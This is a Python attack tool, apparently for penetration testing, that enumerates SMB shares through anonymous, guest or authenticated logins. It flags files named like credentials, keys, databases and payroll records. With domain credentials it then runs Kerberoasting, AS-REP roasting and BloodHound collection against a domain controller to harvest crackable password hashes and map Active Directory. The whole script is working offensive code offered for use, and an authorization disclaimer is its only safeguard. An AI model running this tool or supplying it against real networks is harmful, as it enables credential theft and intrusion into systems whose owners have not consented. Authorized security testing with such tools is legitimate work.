#!/usr/bin/env python3
"""
SMB Sensitive File Scanner
For authorized security audits only. Only use on systems you own or have explicit written permission to test.
"""

import argparse
import subprocess
import sys
import re
from pathlib import PureWindowsPath
from datetime import datetime

try:
    from impacket.smbconnection import SMBConnection, SessionError
except ImportError:
    print("[-] impacket not found. Install with: pip install impacket --break-system-packages")
    sys.exit(1)

# ── Sensitive file patterns ────────────────────────────────────────────────────
SENSITIVE_PATTERNS = {
    "Credentials / Secrets": [
        r"password", r"passwd", r"credentials?", r"secret", r"api[_\-]?key",
        r"token", r"auth", r"\.env$", r"\.htpasswd$", r"shadow$", r"\.pem$",
        r"\.key$", r"\.p12$", r"\.pfx$", r"id_rsa", r"id_dsa", r"id_ecdsa",
    ],
    "Configuration / Infrastructure": [
        r"config\.", r"settings\.", r"\.cfg$", r"\.conf$", r"\.ini$",
        r"web\.config$", r"appsettings\.json$", r"\.yaml$", r"\.yml$",
        r"docker-compose", r"\.terraform",
    ],
    "Database": [
        r"\.sql$", r"\.db$", r"\.sqlite$", r"\.mdb$", r"dump\.", r"backup\.",
        r"database\.", r"connection[_\-]?string",
    ],
    "Financial / PII": [
        r"salary", r"payroll", r"invoice", r"bank", r"credit[_\-]?card",
        r"ssn", r"social[_\-]?security", r"passport", r"tax",
    ],
    "Source / Deployment": [
        r"\.bak$", r"\.old$", r"\.orig$", r"~$", r"\.swp$",
        r"\.git$", r"\.svn$", r"deploy", r"release", r"private",
    ],
}

COMPILED = {
    cat: [re.compile(p, re.IGNORECASE) for p in pats]
    for cat, pats in SENSITIVE_PATTERNS.items()
}

MAX_DEPTH = 6  # prevent runaway recursion on deep shares


def classify(filename: str) -> list[str]:
    """Return list of matching sensitivity categories for a filename."""
    hits = []
    for cat, patterns in COMPILED.items():
        if any(p.search(filename) for p in patterns):
            hits.append(cat)
    return hits


def try_connect(host: str, port: int, username: str, password: str,
                domain: str = "") -> SMBConnection | None:
    label = "anonymous" if not username else f"{domain}\\{username}" if domain else username
    try:
        conn = SMBConnection(host, host, sess_port=port, timeout=10)
        conn.login(username, password, domain)
        print(f"  [+] Connected as: {label}")
        return conn
    except SessionError as e:
        print(f"  [-] Login failed ({label}): {e.getErrorString()[0]}")
        return None
    except Exception as e:
        print(f"  [-] Connection error: {e}")
        return None


def list_shares(conn: SMBConnection) -> list[str]:
    try:
        return [s["shi1_netname"][:-1] for s in conn.listShares()]
    except Exception as e:
        print(f"  [!] Could not list shares: {e}")
        return []


def walk_share(conn: SMBConnection, share: str, path: str = "",
               depth: int = 0) -> list[dict]:
    if depth > MAX_DEPTH:
        return []
    findings = []
    try:
        entries = conn.listPath(share, f"{path}\\*" if path else "*")
    except Exception:
        return findings

    for entry in entries:
        name = entry.get_longname()
        if name in (".", ".."):
            continue
        full_path = f"{path}\\{name}" if path else name
        if entry.is_directory():
            findings.extend(walk_share(conn, share, full_path, depth + 1))
        else:
            cats = classify(name)
            if cats:
                findings.append({
                    "share": share,
                    "path": full_path,
                    "size": entry.get_filesize(),
                    "categories": cats,
                })
    return findings


def kerberoast(domain_ip: str, domain: str, username: str, password: str):
    subprocess.run([
        "impacket-GetUserSPNs",
        "-request",
        "-dc-ip", domain_ip,
        f"{domain}/{username}:{password}"
    ])


def bloodhound(domain_ip: str, domain: str, username: str, password: str):
    subprocess.run([
        "nxc",
        "ldap",
        domain_ip,
        "-u", username,
        "-p", password,
        "--bloodhound",
        "--collection", "All",
        "--dns-server", domain_ip
    ])


def asreproast(domain_ip: str, domain: str, username: str):
    subprocess.run([
        "impacket-GetNPUsers",
        "-dc-ip", domain_ip,
        "-request",
        f"{domain}/{username}"
    ])


def _run_scan(conn: SMBConnection, host: str, auth_label: str,
              target_shares: list[str]) -> None:
    shares = list_shares(conn)
    if not shares:
        print("  [!] No shares accessible.")
        return  # return is now inside the if-block, not before the print statements

    print(f"  [+] Accessible shares: {', '.join(shares)}")

    to_scan = [s for s in shares if s.upper() not in ("IPC$",)]
    if target_shares:
        to_scan = [s for s in to_scan if s.lower() in
                   {t.lower() for t in target_shares}]

    all_findings: list[dict] = []
    for share in to_scan:
        print(f"\n  [>] Scanning \\\\{host}\\{share} ...")
        findings = walk_share(conn, share)
        all_findings.extend(findings)
        for f in findings:
            cats = ", ".join(f["categories"])
            size_kb = f["size"] // 1024
            print(f"    [!] {f['path']}  ({size_kb} KB)  → {cats}")

    if not all_findings:
        print(f"\n  [~] No sensitive files found ({auth_label}).")
    else:
        print(f"\n  [=] Total sensitive files found: {len(all_findings)} ({auth_label})")


def scan(host: str, port: int, username: str, password: str, domain: str,
         domain_ip: str, target_shares: list[str]) -> None:
    print(f"\n{'='*60}")
    print(f"  SMB Sensitive File Scanner")
    print(f"  Target : {host}:{port}")
    print(f"  Time   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'='*60}\n")

    # ── Phase 1: anonymous ─────────────────────────────────────────────────────
    print("[*] Phase 1 — Anonymous / guest login")
    conn = try_connect(host, port, "", "")
    if conn is None:
        conn = try_connect(host, port, "guest", "")

    if conn:
        _run_scan(conn, host, "anonymous", target_shares)
        conn.logoff()
    else:
        print("  [~] Anonymous access not available.")

    # ── Phase 2: authenticated ─────────────────────────────────────────────────
    if username:
        print(f"\n[*] Phase 2 — Authenticated login ({username})")
        conn = try_connect(host, port, username, password, domain)
        if conn:
            _run_scan(conn, host, username, target_shares)
            conn.logoff()
    else:
        print("\n[*] Phase 2 skipped — no credentials supplied (use -u/-p).")

    # ── Phase 2: authenticated - Kerberoast ────────────────────────────────────
    if username and domain_ip:
        print(f"\n[*] Phase 2 — Kerberoast ({username})")
        kerberoast(domain_ip, domain, username, password)
    else:
        print("\n[*] Kerberoast skipped — no credentials or domain IP supplied (use -u/-p/-dip).")

    # ── Phase 2: authenticated - BloodHound ────────────────────────────────────
    if username and domain_ip:
        print(f"\n[*] Phase 2 — BloodHound collection ({username})")
        bloodhound(domain_ip, domain, username, password)
    else:
        print("\n[*] BloodHound skipped — no credentials or domain IP supplied (use -u/-p/-dip).")

    # ── Phase 2: authenticated - AS-REP Roast ──────────────────────────────────
    if username and domain_ip:
        print(f"\n[*] Phase 2 — AS-REP Roast ({username})")
        asreproast(domain_ip, domain, username)
    else:
        print("\n[*] AS-REP Roast skipped — no username or domain IP supplied (use -u/-dip).")


def main():
    parser = argparse.ArgumentParser(
        description="SMB Sensitive File Scanner — authorized use only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Anonymous only
  python smb_scanner.py 192.168.1.10

  # Authenticated (domain optional)
  python smb_scanner.py 192.168.1.10 -u admin -p 'P@ssw0rd' -d CORP

  # Scan specific shares only
  python smb_scanner.py 192.168.1.10 -u admin -p 'P@ssw0rd' -s Finance HR
        """
    )
    parser.add_argument("host", help="Target IP or hostname")
    parser.add_argument("--port", type=int, default=445, help="SMB port (default: 445)")
    parser.add_argument("-u", "--username", default="", help="Username for Phase 2")
    parser.add_argument("-p", "--password", default="", help="Password for Phase 2")
    parser.add_argument("-d", "--domain", default="", help="Domain (optional)")
    parser.add_argument("-dip", "--domain-ip", default="", help="Domain IP Address (optional) for Phase 2")
    parser.add_argument("-s", "--shares", nargs="+", metavar="SHARE",
                        help="Limit scan to specific share names")
    args = parser.parse_args()

    scan(
        host=args.host,
        port=args.port,
        username=args.username,
        password=args.password,
        domain=args.domain,
        domain_ip=args.domain_ip,
        target_shares=args.shares or [],
    )


if __name__ == "__main__":
    main()
